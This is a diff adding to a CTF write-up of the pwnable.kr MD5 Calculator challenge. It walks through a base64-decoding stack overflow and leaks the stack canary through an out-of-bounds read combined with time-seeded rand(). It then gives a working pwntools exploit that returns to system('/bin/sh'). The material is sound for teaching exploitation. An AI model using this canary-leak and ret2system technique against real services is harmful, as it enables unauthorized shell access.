@@ -1,5 +1,7 @@
 #  MD5 Calculator
 
+I dont have `IDA` pro, which makes me really sad.
+
 Lets dive into `process_hash`.
 
 After a long session of `IDA`ing, I figured out that the code looks something like this:
@@ -22,6 +24,8 @@ int32_t process_hash() {
     char *md5str = calc_md5(arr, length);
     printf("MD5(data) : %s\n", md5str);
     free(md5str);
+
+    stack_check(); /* This nasty guy! */
 }
 ```
 
@@ -95,3 +99,117 @@ int32_t calc_md5(char *arr, int len) {
 ```
 
 Whats interesting here is that a decoding of a `1024` bytes long `base64` encoded buffer can be about `1024*0.75 == 768` bytes long, which is way more than the `512` bytes long array used to hold the result.
+
+But, we have a stack canary. There are a few possible ways to attack this problem, when the easiest one is to look for an information leak.
+
+I initially wanted to ignore this function, but I guess its there for a reason:
+
+```c
+int32_t my_hash() {
+    int32_t arr[8];
+    int32_t *p = arr;
+    int32_t ret = 0;
+
+    for(int32_t i = 0; i < 8; ++i) {
+        arr[i] = rand();
+    }
+
+    ret += (arr[1] + arr[5]);
+    ret += (arr[2] - arr[3]);
+    ret += (arr[7] + arr[8]); /* ??? */
+    ret += (arr[4] - arr[6])
+    
+    return ret;
+}
+```
+
+Wtf? There seems to be an access to `arr[8]`, but the array is only `32` bytes long... which means this is the canary! We got the information leak we needed.
+
+But theres a catch. `rand` is seeded with `time(NULL)` on the `pwnable.kr` machine, so to predict its output, we need to sit on that machine, and be able to process the hash in less than a second (since `time` is precise to the second).
+
+From playing with `gdb`, I get that to overrite the saved `eip` in `process_hash`, I need an offset of `528` bytes, and then the new address.
+
+Now's a good time to try the new trick I've learnt:
+
+```bash
+fd@prowl:/tmp/dir$ pwn checksec hash
+[*] '/tmp/dir/hash'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+Well, as we can see, `NX` is enabled, so we cant just `ret` to our shellcode. Unfortunate. But atleast theres no `pie`, so we can use constant addresses.
+
+Digging in a bit deeper, we see that we can call `system`, which is at `0x8048880`, which we can direct the flow to. We just need to make sure its called with `/bin/sh`, so we can get a shell, but thats no problem, since we can just put it on our global buffer!
+
+So we have something along these lines (but we need to make sure we run it from the `pwnable.kr` server):
+
+For computing the canary, we have the `get_canary` snippet:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+int main(int argc, char const *argv[])
+{
+    srand(time(NULL));
+
+    if(argc < 2) {
+        return 1;
+    }
+
+    int captcha = atoi(argv[1]);
+    int canary;
+    int arr[8];
+
+    for(int i = 0; i < 8; ++i) {
+        arr[i] = rand();
+    }
+
+    canary = captcha;
+    canary -= (arr[1] + arr[5]);
+    canary -= (arr[2] - arr[3]);
+    canary -= arr[7];
+    canary -= (arr[4] - arr[6]);
+
+    printf("%x\n", canary);
+    return 0;
+}
+```
+
+And for the actual exploitation:
+```python
+from pwn import *
+
+SYSTEM = 0x8048880
+G_ENCODED_ADDR = 0x0804b0e0
+ENCODED_PAYLOAD_LEN = 720
+
+conn = remote('localhost', 9002)
+
+conn.recvuntil(' : ')
+captcha = conn.readline().strip()
+
+print '[+] captcha: {}'.format(captcha)
+
+proc = process(['./get_canary', captcha])
+
+canary = int(proc.readall().strip(), 16)
+
+print '[+] canary: {}'.format(canary)
+
+conn.sendline(captcha)
+conn.recvuntil('paste me!\n')
+
+payload = b64e('A'*512 + p32(canary) + 'A'*12 + p32(SYSTEM) + "A"*4 + p32(G_ENCODED_ADDR + ENCODED_PAYLOAD_LEN)) + '/bin/sh\x00'
+print payload
+
+conn.sendline(payload)
+
+conn.interactive()
+```
+
+And thats how we do it.
